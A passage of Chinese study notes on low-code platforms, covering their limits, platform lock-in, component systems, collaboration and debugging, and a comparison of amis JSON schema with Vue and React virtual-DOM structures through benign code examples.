**后端团队**，\n\t- 就会选择第 4 种，因为只负责后端开发\n- 大公司内的工程团队，会选择第 2 种，\n\t- 但这种形式一般有很多定制功能，并且依赖公司内部`基础设施`，导致只能在内`部使用`。\n- 如果是**创业公司**，往往会选择第 5 种形式，面向外部当然是前后端都封装起来更简单，\n\t- 但可能过于追求「无代码」，导致虽然用起来简单，却失去了灵活性，只适合简单应用。\n- 如果公司本身有**成熟产品**了，自然是选择第 6 种方式，围绕这个产品来扩展更有优势。\n\n**因此下次在了解一款低代码产品前，先了解它背后是什么团队，擅长做什么，团队背景将在很大程度上决定这款产品的侧重点。**\n\n## 3. 之前是否有低代码平台？它们是怎么做的？\n\n很多了\n-  Microsoft Access\n- SaaS 软件 Salesforce \n\n## 4. 低代码究竟能解决什么问题？\n\n《人月神话》定义所有软件活动包括：  \n- 根本任务：打造构成抽象软件实体的复杂概念结构。 \n- 次要任务：使用编程语言表达这些抽象实体，在空间和时间限制内将它们映射成机器语言\n\n比如，做一个计算所得税的软件\n- **根本任务**是实现这个所得税的算法\n- **次要任务** 用什么语言实现这个算法\n\n低代码平台主要解决的是「**次要任务**」，用更简化的方式来实现同样的功能，\n\n### 4.1. 低代码的几种做法\n\n1. 提供一种简化的 DSL，类似 Excel 里的公式。\n2. 提供图形化代码编辑器，类似 Unreal Engine 里的「蓝图」，或者类似 [Blockly](https://link.zhihu.com/?target=https%3A//developers.google.com/blockly)/[Scratch](https://link.zhihu.com/?target=https%3A//scratch.mit.edu/) 那种拼图的方式。\n3. 支持写代码或外部 api 来扩展。\n4. 平台内置实现，比如前面提到的个人所得税，平台可以内置一个专门算这个的函数。\n\n### 4.2. 第 1 种：DSL 的方式\n\n其中 DSL 的方式只适合简单场景，因为 **DSL 一般不具备复杂的逻辑控制、定义函数等功能**，DSL 中要加入这些功能还不如直接用成熟的语言，比如 JavaScript/Lua。\n\n### 4.3. 图形化编程为什么不可行？（第 2 种做法为什么不可行）\n\n以 UE4 里的蓝图为例，这是我见过最复杂的可视化代码编辑器，可以用它来编写着色器和控制游戏流程：\n\n![图片&文件](./files/20241106-1.png)\n\n图形化编程在三维设计领域取得了不少成绩，比如 Blender、Grasshopper、Houdini、NUKE、Substance Designer 等，通过节点编程的方式极大提升了灵活度，但这些**都是针对特定领域优化，并不是通用编程方式**。\n\n> 人月神话：流程图是一种非常差劲的软件结构表达方式。实际上，它最好被视为是 Burks, von Neumann 和 Gold stine 试图为他们说设计的计算机提供一种当时迫切需要的高级控制语言。如今的流程图已经变得复杂了，一张图有若干页，有很多连接点，这种表现形式实在令人同情。流程图已经被证明是完全不必要的设计工具--程序员是在开发之后，而不是之前绘制描述程序的流程图。  更加基本的是，如我们上面所讨论的，软件非常难以可视化。即使用图形表达出了流程图、变量范围嵌套情况、变量交叉引用、数据量和层次化数据结构等等，也只是表达了某个方面，就像盲人摸象一样。\n\n**流程图最早是给汇编语言用的**，因为汇编代码里都是跳来跳去的，看着容易晕，有这样的图可以看起来更清晰：\n\n![图片&文件](./files/20241106.png)\n\n==但在高级语言下就不需要这个了，因为高级语言下的代码可读性和这张图是一样的==\n\n> 《人月神话》20 周年纪念版：流程图是被吹捧得最过分的一种程序文档。详细逐一记录的流程图是一件令人生厌的事情，而且高级语言的出现使它显得陈旧过时。\n\n### 4.4. 第 3 种，直接通过代码扩展功能\n\n目前排名靠前的低代码平台都支持代码扩展，比如 Salesforce 和 ServiceNow，尤其是 `ServiceNow` 在前后端都使用 JavaScript，后端用到了 ==Rhino 引擎==。\n\n### 4.5. 第 4 种方法：平台内置实现\n\n有些低代码平台针对某个垂直领域做了优化，集成了许多这个行业常见的功能，在同一个行业中，一家公司要解决的「根本任务」，在另一家公司大概率也会遇到，因此使用这种低代码平台可以明显降低成本。\n\n比如淘宝可以算是电商行业的「低代码」平台，它把各种电商相关的功能都集成进去了，同时还提供了店铺装修功能实现个性化设计。\n\n## 5. 低代码平台适合用在什么地方？\n\n什么样的应用适合使用低代码平台？\n- 目前看来最适合的场景是**面向企业内部员工**（**B2E**）的应用，也就是**企业内部的各种系统及平台**。\n\n对外应用的低代码平台：一般都是公司主营业务，需要很高的自主可控性，而且定制需求多，对展现的要求也很高，没法复用低代码平台中的组件，只能通过自定义代码扩展，但==如果大量使用代码扩展就还不如完全自己开发了==。\n\n## 6. 低代码平台会带来什么新问题？\n\n- 扩展性、难以支持复杂场景、性能等问题，但最根本的是**平台锁定**，许多问题都是这点带来的：\n\t- 平台使用自己**内部独立的框架**，需要额外的学习成本。\n\t- 平台是个**黑盒**，不清楚内部如何实现，遇到 bug、性能等问题只能求助官方。\n\t- 如果有的需求不能满足，需要等平台的**排期升级**。\n\t- **信息分布在各处**，不像本地代码那样方便全局搜索，对于不熟悉的新人往往得在各个界面里找半天，而且是功能越强大的平台越难找。\n\t- **不方便多人协作**，有的平台只提供少量环境，难以做复杂的分支管理。\n\t- **平台后续发展是个未知数**，哪天倒闭了怎么办？Google 4 年前发布了一款低代码创建 APP 的产品 [Google App Maker](https://link.zhihu.com/?target=https%3A//developers.google.com/appmaker)，既能可视化创建界面，又能写 JavaScript 扩展功能，但它在今年 2 月份的时候[宣布关闭](https://link.zhihu.com/?target=https%3A//gsuiteupdates.googleblog.com/2020/01/app-maker-update.html)，无法导出，用户只能自己重写一个，连 Google 的低代码平台都会关闭，其它小公司就更别说了。\n\n低代码平台为什么做不到开放？在我看来主要是两个原因：\n1. 技术上的矛盾，为了实现低代码就得==隐藏很多不必要的细节==，而这些细节有的依赖平台底层框架，有的依赖平台编辑器，这些都是低代码平台**最核心的技术**，没法开源。\n2. 商业上的矛盾，如果能方便导出，让使用者可以二次修改并部署到任意地方，低代码平台就变成离线开发工具了，只要一个帐号就能开发无数应用**，不利于商业化**，因此甚至**有的低代码平台只提供 SaaS 版本，只能在线使用**。\n\n> 1. 平台锁定这个问题在国内更严重，有种说法是古代中国属于大陆农业文明，农业文明的特点是强调自给自足，能不求人就不求人，这个长期影响很难改变，所以**国内公司一变大就希望什么都自己掌握，信不过别人**。\n> 2. 目前国内只有一个封闭的开发平台取得了巨大成功，这个平台是微信小程序，相比原生 APP 开发，微信小程序的开发成本更低，而且还跨平台，所以**其实也能算是低代码**\n\n## 7. 低代码平台的难点在哪？\n\n低代码平台的难点是如何**同时满足易用性和灵活性**\n\n以低代码平台中必备的可视化页面编辑器为例，要怎么实现页面布局？主要有三种做法：\n1. 基于 flexbox/float 方式来布局，这种方式`灵活性强`，但`牺牲了易用`性，需要使用者至少懂点 css，不然用不明白。\n2. 基于绝对定位来布局，这种方式`易用性强`，想拖哪就拖哪，但又失去了`灵活性`，要支持多分辨率就得手机和 PC 单独编辑，而且不好实现根据内容自动撑开高度。\n3. 提供水平/垂直分栏的容器，通过它们`组合来实现各种布局`，这种方式处于上面两者之间，`灵活性和易用性都不突出`，只适合用在移动端或后台类的页面。\n\n>  所以复杂灵活的可视化编辑器有可能吃力不讨好，那偏向易用性呢？有些低代码平台追求「**零代码**」，让普通人都能用起来，但这样会面临另一个意想不到的强大竞品：「**Excel**」，对于普通人来说 Excel 就是一个好用的数据库，可以添加数据、修改数据、查找数据、排序过滤等，还能做图表，无需开发应用就能管理数据。\n\n## 8. 前端如何低代码？\n\n### 8.1. 是否可以给 UI 组件库加个可视化编辑器？\n\n之前也有很多人尝试过，但行不通，**因为 UI 组件库一般只作为页面中的一部分,UI 库必须用代码来连接各个功能**，比如数据的加载和绑定、事件的处理等，这些功能难以使用可视化编辑器来实现。\n\n## 9. 后端如何低代码？\n\n在后端方面，低代码平台主要能解决这几类问题：\n\n- 系统开发通用性问题，比如\n\t- 登录、帐号/角色、权限管理\n\t- 页面路由和导航\n\t- 外部系统对接，有的还提供一种通用协议来连各种数据源\n- 数据管理，增删改查\n- 流程管理\n- 开发及运行环境\n\n其中最常用的是增删改查，要如何实现？目前见到有这 3 种方式：\n1. **基于表单**，优点是用起来简单，只需要设计好表单就可以用了，但缺点是灵活性要弱，难以支持复杂的关系。\n2. **基于数据模型**，需要先定义数据模型，优点是灵活性强，但易用性又差了，非开发人员使用会有成本。\n3.  **提供 BaaS 服务**，比如开源的 [Parse](https://link.zhihu.com/?target=https%3A//parseplatform.org/)，通过提供友好的 API 来实现用户管理、数据存取等功能，这种方式需要写后端代码，但灵活性高。\n\n以我们自己为例，「[爱速搭](https://link.zhihu.com/?target=https%3A//suda.baidu.com/)」**使用了数据模型方式**，\n- 数据模型其实是在数据库表的基础上的封装，所有修改操作会转成表结构的变更，所以用户最好能有点数据库基础知识，牺牲了易用性，为什么要这样做？我们的主要考虑是 ：\n\t- 在灵活性方面和传统数据库开发是一样的，性能也一样，我们希望能支持各种类型的应用开发，而不只是简单的办公场景。\n\t- 开发者更熟悉关系数据库，有些低代码平台基于 MongoDB 来方便扩展字段，但主流项目开发中还是使用关系数据库。\n\t- 可以使用 SQL 对数据进行修改和查询，不仅了解的人多，还能很方便对接外部 BI 平台做数据分析。\n\t- 方便接入现有数据库，爱速搭支持直连已有数据库，基于已有数据开发应用，无需先将数据导入到平台中。\n\t- 减少平台锁定风险，使用传统数据库更容易将现有数据迁移出来，改成转成传统的开发方式，加上前端使用开源 amis 渲染，降低了平台锁定的风险。\n\n### 9.1. 图例：数据模型\n\n![图片&文件](./files/20241106-2.png)\n\n### 9.2. 图例：流程设计\n\n![图片&文件](./files/20241106-3.png)\n\n## 10. 低代码平台是否会大量取代研发？\n\n1. 前面提到过低代码不适合开发面向客户（**toC**）的应用，在许多公司这部分才是**最占人力的**。\n2. 对于企业内部应用，低代码可以显著提升效率，但**效率提升带来的不是人员减少，而是需求增多，很多之前中低优的项目终于排上了**，前面提到百度内部的 amis 创建了 3.3w 个页面，这里面肯定不少是效率提升后多出来的，因为百度没那么多做后台页面的前端人力。\n3. 低代码平台解决不了「**根本任务**」，图形化编程只适合特定场景，用它来做控制流还不如写代码，因此依然需要研发。\n\n## 11. 未来会怎样？\n\n- 图形化编程只能在特定领域成功，目前看来主要是和**音乐及图形相关的软件**。\n- 面向普通用户的**无代码平台**发展会受限，很多时候还不如用「**Excel**」。\n- 对于成熟的垂直领域，**购买软件是成本最低且效果最好的选择**，比如数据可视化，我们的 [Sugar](https://link.zhihu.com/?target=https%3A//cloud.baidu.com/product/sugar.html) 开发了好多年，而购买只需几万就能立刻用上。\n- 低代码在国内和国外会有明显区别，国内更喜欢==私有部署==而不是 ==SaaS 版本==，技术锁定将会是在国内推广时的最大障碍。\n- 低代码平台不适合用来开发面向客户的应用，以后也一样。\n- 对于企业内部应用，低代码平台将会发挥重要作用，它已经被实践证明可以极大提升效率，很值得尝试。","Js0XKBlx":"\n# 精读：低代码的组件体系的建设和实践\n\n`#lowcode` \n\n> 源于精读： https://mp.weixin.qq.com/s/rnvbGHImGt6oJuX2wCtaqw\n\n\n## 目录\n<!-- toc -->\n ## 1. 基础组件 \n\n- 大部分的前端团队已经很少再从零开始写基础组件库\n- 挑选一个合适的符合自己业务特点和技术选型的**基础组件库**，并基于此生产适合自己业务的业务组件库，相信是更多人的选择。\n\t- 常用的组件库如下图\n\n![图片&文件](./files/20241201-32.png)\n\n通常我们会从四个角度出发去封装我们的**业务组件库**：\n\n- 业务数据：\n\t- 将基础组件与**业务数据**接口结合，如**选人、选部门、选城市**等\n\t\t- 比如房产？按城市区域筛选房子就很常见\n- 业务场景：\n\t- **业务中出现的一些通用场景**，以大颗粒度的形式封装起来，常见于表格、表单、图表场景\n- 业务特色：\n\t- 业务里**独有的交互形式**，可以由一些基础组件拼合而成\n- 品牌主题：\n\t- 将基础组件修改为和**业务产品品牌设计相符合的样式**\n\n## 2. 业务组件与低代码\n\n**普通物料**和**低代码项目**的物料的差异主要在于\n- 除了正常的组件渲染逻辑外\n- 低代码应用需要**物料的名称、描述、截图、logo 等**信息\n- 以及**哪些属性**可以供用户配置和更改\n\n比如下图的`Pro 基础组件`和`低代码按钮组件`\n\n![图片&文件](./files/20241201-33.png)\n\n## 3. 已有物料 → 添加配置信息 → 可搭建物料？\n\n![图片&文件](./files/20241201-34.png)\n\n![图片&文件](./files/20241201-35.png)\n\n![图片&文件](./files/20241201-36.png)\n\n\n业务组件：\n- 通常是基于基础组件之上完成的，封装接口、业务逻辑提高复用性是他的主要场景，所以大部分没有复杂的交互\n- 但相比起基础组件来说，变更会更频繁。\n- 用低代码生产很高地适应了这些特点，它具备极低的上手门槛，更高的研发效率以及对低代码项目天然的友好性。\n\n\n![图片&文件](./files/20241201-37.png)\n\n## 4. 组件是什么？\n\n### 4.1. 组件的特性\n\n- 封装性：逻辑和 UI 被封装在一个黑盒中，对外部使用者不可见，外部使用者也无法直接修改被封装的逻辑和 UI。\n- 接口性：由于封装性的存在，这个黑盒需要暴露一些对外的接口，从而实现与外部的通信以及外部对组件的控制。\n- 切面性：组件从初次渲染到最终卸载过程中会经历多个阶段，通常情况下需要提供这些阶段的控制能力，如生命周期的概念。\n- 独立性：组件不必和应用的维护和发版保持一致，可以独立维护和发版。\n- 复用性：组件不会只被应用消费，本身应该可以引用其他组件或者被其他组件引用\n\n### 4.2. 组件的能力分层\n\n![图片&文件](./files/20241201-38.png)\n\n- 基础能力的部分是一个组件必备的部分，用于实现**组件最基本的功能**。\n- 增强能力则是有了之后会比没有的情况下更易用的部分。\n- 预览调试的功能用来帮助用户开发地更顺畅。\n- 而发布消费则是在组件生产结束后如何给到项目中去使用\n\n### 4.3. 属性\n\n即特殊的组件状态 `props`\n- 组件内可以直接绑定 `props`\n- 或者在逻辑块中通过 `props.xxx` 来获取\n\n### 4.4. 声明周期\n\n我们需要在低代码组件的**最外层容器组件**上对这个**五个声明周期**进行实现\n\n![图片&文件](./files/20241201-39.png)\n\n### 4.5. 预览和调试\n\n![图片&文件](./files/20241201-40.png)\n\n### 4.6. 低代码消费组件\n\n![图片&文件](./files/20241201-41.png)\n\n### 4.7. 项目内调试\n\n- 源码组件是通过启动一个本地 server 的形式来和页面进行通信的\n- 低代码组件的调试：\n\t- 用 BroadCastChannel 进行 Tab 间通信，当一个低代码组件的设计器被打开时，会告知页面有组件处于调试中\n\t- 如果页面是后打开的，他也会通过这个通道询问目前是否有正处于调试状态的插件。\n\t- 建立链接后，当组件更新，就可以通过这个通道，告知页面最新的组件 schema，页面拿到后进行重新渲染实现实时调试。\n\n![图片&文件](./files/20241201-42.png)\n\n### 4.8. 低代码组件拥有自己的依赖管理能力\n\n![图片&文件](./files/20241201-43.png)\n\n### 4.9. 组件的版本管理\n\n- 一个组件应该可以在不同时刻发布不同的版本，应用可以选择性地安装不同版本。\n- 低代码组件同样支持发布不同的版本，每个不同版本我们会根据版本号，记录他的 schema，物料描述以及依赖配置。\n- 我们还**特意设计了一个调试版本 0.1.0，这个版本永远与线上最新的记录同步，方便用户进行应用内的调试**。\n\n![图片&文件](./files/20241201-44.png)\n\n> 这样就不会冲突了，默认 0.1.0 版本用于调试\n\n### 4.10. 低代码组件和源码项目的结合\n\n- 低代码生产的组件**也应该能在源码中使用**。有两种方式\n\t- 方式一：渲染器提供渲染API\n\t\t- 在源码组件中直接调用 `lowcode.render(jsonSchema)` 即可\n\t- 方式二：出码\n\t\t- 使用 LowCodeEngine 的出码模块对组件的 schema 进行出码，转换为 React 代码，同时分析组件的依赖以及物料描述，生成组件所需的 package.json，再补充其他的工程文件。组成一个完整 React 组件脚手架，再利用这个脚手对组件进行构建发布，最终生成一个 npm 包。这个 npm 包其本质就是一个纯粹的 React 组件，因此他可以在任何 React 项目中直接使用。\n\t\t\t- ![图片&文件](./files/20241201-45.png)\n\n### 4.11. 历史记录 & 容灾\n\n- 在 schema 的存储逻辑上，我们做了多层记录\n\t- 其中包括以保存时间为维度的**云端存储**「历史记录」\n\t\t- 「历史记录」可以帮助用户方便地切换至某次保存时的 schema，用于应对 hotFix，推倒重来等网络通信没有出现问题时的修改。\n\t- 还有以间隔时间为维度的**本地存储**「容灾存储」。\n\t\t- 「容灾存储」则会定时在本地记录用户的 schema，这样当平台的网络出现问题时，用户的修改也不会丢失，只是暂时没有与云端进行同步，可以等到网络恢复时再重新完成同步\n\n## 5. 更多\n\n- 面向多角色的协同：\n\t- P2C/D2C/C2D 等与产品、设计实现更高效率的协同\n- 复杂交互能力增强：\n\t- 动效、手势、拖拽等复杂交互场景的封装\n- 组件质量保障：\n\t- 代码规范检查、Code Review 和 自动化测试\n\n\n","RdZpU1Da":"\n# 调研：设计器交互体验\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 设计器定制 \n\n- 通过设计器插件，我们可以直接使用生态中流通的插件，也可以根据我们自己的需求进行插件的开发。\n- 通过编写不同的插件同引擎核心模块进行交互，在满足多样化的功能的同时，同时也与低代码引擎解耦。\n\n## 设置器定制\n\n如何设计一个组件？\n\n- 文本组件：\n\t- 文本设置器\n\t\t- ![图片&文件](./files/20241201.png)\n\n## 组件类型分类\n\n- 内置基础组件，低代码组件，可开箱即用\n- 存量组件，源码组件、或者 Pro 组件，如何转换低代码组件？\n- 扩充低代码组件：\n\t- 开发能力\n\t- 低代码组件项目初始化\n\t- 低代码组件调试\n\t- 低代码组件配置等能力\n\n## 磁贴布局\n\n### 报表场景非常通用\n\n- 各类 BI 产品（QuickBI、BDP）以及和宜搭同类型低代码产品（简道云、氚云）\n- 报表/仪表盘页面搭建场景基本上都使用磁贴布局，这也说明**磁贴布局适用于报表场景**是经过了充分验证的\n\n### 基础能力\n\n![图片&文件](./files/20241201-1.png)\n\n\n先看看两种布局方式\n\n- **纵向挤占布局**时，元素会在垂直方向（y轴方向）紧凑布局\n\t- ![图片&文件](./files/钉钉宜搭报表设计引擎磁贴布局.gif)\n- **横向挤占布局**时，元素会在横轴方向（x轴方向）紧凑布局\n\t- ![图片&文件](./files/钉钉宜搭报表设计引擎磁贴布局(1).gif)\n\n由于页面是从上往下排的，因此整体来说**纵向挤占布局更加符合直觉**，这也是大部分产品使用纵向挤占的原因\n\n### 竞品分析\n\n![图片&文件](./files/20241201-2.png)\n\n## 磁贴 & 流式布局混排\n\n- 页面整体为磁贴布局\n- 由**容器和分栏组件**来支持原来的流式布局\n\n## 关于布局组件\n\n- https://dsmorse.github.io/gridster.js/#demos\n- Muuri-vue\n- https://github.com/react-grid-layout/react-grid-layout\n- https://github.com/SortableJS/vue.draggable.next\n\n## 参考\n\n- https://mp.weixin.qq.com/s/PSTut5ahAB8nlJ9kBpBaxw\n- https://mp.weixin.qq.com/s/TY3VXjkSmsQoT47xma3wig","5MoFkLjZ":"\n# 调研：低代码开发如何协同？\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 背景 \n\n- 不支持**并行开发**\n\t- 导致开发人员的闲置，限制了开发时长和协同方式。\n- **不支持迭代模式**。\n\t- 不具备隔离性，无法支持复杂应用生命周期的迭代需求，尤其对于快速迭代升级的业务，导致迭代成本非常高。\n- **无法合并修改**。\n\t- 复杂、无规范的手动合并流程，只有对协议很熟悉的专业人士才能操作，导致合并和验证成本提高。\n\t\t- 比如，下面这个\n\t\t\t- ![图片&文件](./files/20241201-46.png)\n\n## 2. 当下解法\n\n- 约定：即通过适当的进行拆分解耦\n\t- page1 你来，page2 我来\n- 锁定 🔒\n\t- 这个我正在配置，你别来\n\n## 3. 好的解法\n\n### 3.1. 首先使用标准数据存储，别直接保存大 JSON\n\n- 应用的所有数据，都是以**结构化数据**的格式存储于**数据库**中。\n- 数据包括了两种类型，每个应用都会有一份全局的**应用数据**，关联多个**页面数据**\n\n![图片&文件](./files/20241201-47.png)\n\n### 3.2. 借鉴传统研发模式\n\n![图片&文件](./files/20241201-48.png)\n\n![图片&文件](./files/20241201-49.png)\n\n![图片&文件](./files/20241201-50.png)\n\n## 4. 参考\n\n- https://mp.weixin.qq.com/s/DmwxL67htHfTUP1U966N-Q","6hlZup1b":"\n# 低代码平台的调试开发\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 开启调试开发 \n\n- 新建应用\n- 新建应用\n- 新建组件\n- 管理后台\n\t- 应用管理\n\t- 组件管理、本地组件\n\t- 页面管理\n\t- 都有开关，可以打开调试模式，默认端口，也可以配置端口\n\n>  因为使用了 [vite-plugin-federation](https://github.com/originjs/vite-plugin-federation)\n>  只有主机端支持开发模式，远程端需要使用 vite build 生成 RemoteEntry.js 包。这是因为 Vite 开发模式是无打包的，您可以使用 `vite build --watch` 来实现热更新效果。\n\n## 2. Schema 面板\n\n- json schema 协议校验\n\n>  制定过一版本的 JSON Schema 协议的，后面都是TS 来制定了\n\n## 3. 数据源面板：Vue-DevTools pinia \n\n参考下图，也可以直接再左侧中查看啊，但没做这个事情\n\n![图片&文件](./files/20241201-71.png)\n\n- 数据状态\n- 大纲树\n\n>  点击客户互相跳转，类似于编辑器，可以快速搜索\n\n## 4. 开发日志信息\n\n需要在控制台面板打开\n\n## 5. 开发体验及问题反馈\n\n- 通过一个**显眼的标识**来告诉用户，你开发的页面出现错误了\n\t- 比如 debug 图标\n\t\t- ![图片&文件](./files/20241201-16.png)\n- 错误信息整理\n\t- 错误码？\n\t- `组件 ID` 是多少\n\t- 用户配置的表达式内容是什么\n\t- **一键复制**给值班同学，发到反馈群里，方便定位协调问题\n\t\t- 因为很多同学都是不同城市的\n\t\t- 复制信息是标准化的，比如报错信息，schema 信息等等\n- `Schema` 信息的查看\n\t- 对应==大纲==\n- 全局的 pinia 信息数据插件\n\t- 打开 `Vue-DevTools` 等\n\t\t- 内置了 `pinia` \n- 常见问题 FAQ \n\n## 6. 更高级的玩法\n\n> 基于低代码平台开发一个 DevTools 工具，WebIDE ，等等，甚至搞一个开发者工具 IDE\n\n\n","aXmJbfdh":"\n# 调研：JSON 协议设计（amis、schema 设计、事件流、Vdom 等）\n\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. Schema 结构设计对比 \n\n### 1.1. 先看看 vue dom 的结构\n\n```js\ntype VNodeTypes =\n  | string\n  | VNode\n  | Component\n  | typeof Text\n  | typeof Static\n  | typeof Comment\n  | typeof Fragment\n  | typeof Teleport\n  | typeof Suspense;\n\nconst vdom = {\n  type: \"div\",\n  props: {\n    id: \"foo\",\n  },\n  children: [\n    {\n      type: \"p\",\n      children: \"p tag\",\n    },\n    {\n      type: \"h1\",\n      children: \"H1 tag\",\n    },\n    {\n      type: \"div\",\n      children: [\n        {\n          type: \"span\",\n          children: \"div > span > tag\",\n        },\n      ],\n    },\n  ],\n};\n\n```\n\n> 很重要的一个类型： `type=action`\n\n### 1.2. 再看看一段 React Vdom 示例\n\n#### 1.2.1. JSX \n\n```jsx\nimport React from 'react';\n\nfunction Welcome({ name }) {\n  return <h1>Hello, {name}</h1>;\n}\n\nfunction App() {\n  return (\n    <div className=\"app\">\n      <Welcome name=\"Alice\" />\n      <p>This is a paragraph.</p>\n      <ul>\n        <li>Item 1</li>\n        <li>Item 2</li>\n      </ul>\n      <button onClick={() => alert('Clicked!')}>Click me</button>\n    </div>\n  );\n}\n```\n\n#### 1.2.2. 对应 JSON 树结构\n\n```json\n{\n  \"type\": \"div\",\n  \"props\": {\n    \"className\": \"app\"\n  },\n  \"children\": [\n    {\n      \"type\": \"Welcome\",\n      \"props\": {\n        \"name\": \"Alice\"\n      }\n    },\n    {\n      \"type\": \"p\",\n      \"props\": {},\n      \"children\": [\n        \"This is a paragraph.\"\n      ]\n    },\n    {\n      \"type\": \"ul\",\n      \"props\": {},\n      \"children\": [\n        {\n          \"type\": \"li\",\n          \"props\": {},\n          \"children\": [\n            \"Item 1\"\n          ]\n        },\n        {\n          \"type\": \"li\",\n          \"props\": {},\n          \"children\": [\n            \"Item 2\"\n          ]\n        }\n      ]\n    },\n    {\n      \"type\": \"button\",\n      \"props\": {\n        \"onClick\": {\n          \"__function\": \"() => alert('Clicked!')\"\n        }\n      },\n      \"children\": [\n        \"Click me\"\n      ]\n    }\n  ]\n}\n```\n\n### 1.3. Amis JSON Schema 结构设计\n\n#### 1.3.1. 示例\n\n```json hl:2,8\n{\n  \"type\": \"page\",\n  \"body\": {\n    \"type\": \"form\",\n    \"api\": \"/amis/api/mock2/form/saveForm\",\n    \"body\": [\n      {\n        \"type\": \"input-text\",\n        \"name\": \"name\",\n        \"label\": \"姓名：\"\n      }\n    ]\n  }\n}\n\n```\n\n> 是 `body` 不是上面 vdom 的 `children`  \n\n#### 1.3.2. schema.ts 结构设计\n\n```typescript hl:4,6\nimport {PageSchema} from './renderers/Page';  \nimport {FlexSchema} from './renderers/Flex';  \nimport {TplSchema} from './renderers/Tpl';  \n// 省略 ....，有多少个amis组件，这里就应该多少个 import schema  \n\n// 每加个类型，这补充一下。  \nexport type SchemaType =  \n  | 'form'  \n  | 'alert'  \n  | 'app';  \n  \n  \nexport type SchemaObject =  \n  | PageSchema  \n  | FlexSchema  \n  | TplSchema  \n// 省略 ....，有多少个amis组件，这里就应该多少个 SchemaObject  ;  \n  \nexport type SchemaCollection =  \n  | SchemaObject  \n  | SchemaTpl  \n  | Array<SchemaObject | SchemaTpl>;  \n  \nexport interface SchemaApiObject {  \n  method?: 'get' | 'post' | 'put' | 'delete' | 'patch' | 'jsonp' | 'js';  \n  url: SchemaUrlPath;  \n  data?: {  \n    [propName: string]: any;  \n  };  \n  convertKeyToPath?: boolean;  \n  responseData?: {  \n    [propName: string]: any;  \n  };  \n  attachDataToQuery?: boolean;  \n  dataType?: 'json' | 'form-data' | 'form';  \n  responseType?: 'blob';  \n  headers?: {  \n    [propName: string]: string | number;  \n  };  \n  /**  \n   * 设置发送条件  \n   */  \n  sendOn?: SchemaExpression;  \n  replaceData?: boolean;  \n  autoRefresh?: boolean;  \n  trackExpression?: string;  \n  cache?: number;  \n  forceAppendDataToQuery?: boolean;  \n  qsOptions?: {  \n    arrayFormat?: 'indices' | 'brackets' | 'repeat' | 'comma';  \n    indices?: boolean;  \n    allowDots?: boolean;  \n  };  \n  silent?: boolean;  \n  downloadFileName?: string;  \n}  \n  \nexport type SchemaApi = string | SchemaApiObject;\n```\n\n- 每个类型（`type`） 的组件都有一个 `详细 Schema 结构`来描述\n\t- 详细的 `Schema` 来描述，因为这个后面会直接影响到**编辑态**的展示\n\n#### 1.3.3. 比如 `type = action` 时\n\n```typescript\nexport interface Action extends Button {  \n  actionType?:  \n    | 'submit'  \n    | 'copy'  \n    | 'reload'  \n    | 'ajax'  \n    | 'saveAs'  \n    | 'dialog'  \n    | 'drawer'  \n    | 'jump'  \n    | 'link'  \n    | 'url'  \n    | 'email'  \n    | 'close'  \n    | 'confirm'  \n    | 'add'  \n    | 'remove'  \n    | 'delete'  \n    | 'edit'  \n    | 'cancel'  \n    | 'next'  \n    | 'prev'  \n    | 'reset'  \n    | 'validate'  \n    | 'reset-and-submit'  \n    | 'clear'  \n    | 'clear-and-submit'  \n    | 'toast'  \n    | 'goto-step'  \n    | 'goto-image'  \n    | 'expand'  \n    | 'collapse'  \n    | 'step-submit'  \n    | 'selectAll'  \n    | 'changeTabKey'  \n    | 'click'  \n    | 'stopAutoRefresh'  \n    | 'preview'  \n    | 'zoom';  \n  api?: SchemaApi;  \n  asyncApi?: SchemaApi;  \n  payload?: any;  \n  dialog?: SchemaNode;  \n  to?: string;  \n  target?: string;  \n  link?: string;  \n  url?: string;  \n  cc?: string;  \n  bcc?: string;  \n  subject?: string;  \n  body?: string;  \n  mergeData?: boolean;  \n  reload?: string;  \n  messages?: {  \n    success?: string;  \n    failed?: string;  \n  };  \n  feedback?: any;  \n  required?: Array<string>;  \n  [propName: string]: any;  \n}\n```\n\n#### 1.3.4. 通用字段\n\n- type\n- data 表示数据，另外有数据链的概念\n- classname\n- style\n- hidden / hiddenOn：表达式\n- visible / visibleOn：表达式\n- SchemaArray：即`body: [schem1,schema2]` ，\n- classname\n\n```json\n\"className\": {\n\t\"text-muted\": \"${status == 1}\",\n\t\"text-success\": \"${status == 2}\",\n\t\"text-${status}\": true\n}\n```\n\n- api\n\n```json hl:3,7\n{\n  \"type\": \"crud\",\n  \"api\": {\n    \"url\": \"/amis/api/mock2/sample\",\n    \"method\": \"post\",\n    \"graphql\": \"{ pages(page: $page, perPage: $perPage) { id, engine } }\",\n    \"data\": {\n      \"page\": \"${page}\",\n      \"perPage\": \"${perPage}\"\n    }\n  },\n  \"columns\": [\n    {\n      \"name\": \"id\",\n      \"label\": \"ID\"\n    },\n    {\n      \"name\": \"engine\",\n      \"label\": \"Rendering engine\"\n    }\n  ]\n}\n```\n\n`Definitions`建立当前页面公共的配置项，在其他组件中可以通过`$ref`来引用当前配置项中的内容\n- 下面 `aa` 可以服用\n- 下面 `option` 枚举项可以复用\n\n```json hl:19,3,4\n{\n  \"definitions\": {\n   \"options\":[],  \n    \"aa\": {\n      \"type\": \"input-text\",\n      \"name\": \"jack\",\n      \"value\": \"ref value\",\n      \"labelRemark\": \"通过<code>\\\\$ref</code>引入的组件\"\n    }\n  },\n  \"type\": \"page\",\n  \"title\": \"引用\",\n  \"body\": [\n    {\n      \"type\": \"form\",\n      \"api\": \"api/xxx\",\n      \"actions\": [],\n      \"body\": [\n        {\n          \"$ref\": \"aa\"\n        }\n      ]\n    }\n  ]\n}\n\n```\n\n## 2. AMIS JSON、Vue3 VNode、React JSX VDom 详细对比\n\n### 2.1. 基础结构对比\n\n| 特性       | AMIS JSON     | Vue3 VNode    | React JSX VDom |\n| -------- | ------------- | ------------- | -------------- |\n| **基本格式** | 纯 JSON 对象     | JavaScript 对象 | JavaScript 对象  |\n| **节点类型** | type 字段指定     | type 属性       | type 属性        |\n| **属性定义** | props 对象      | props 对象      | props 对象       |\n| **子节点**  | body/items 数组 | children 数组   | children 属性    |\n\n### 2.2. 属性处理\n\n| 特性        | AMIS JSON          | Vue3 VNode     | React JSX VDom     |\n| --------- | ------------------ | -------------- | ------------------ |\n| **样式处理**  | 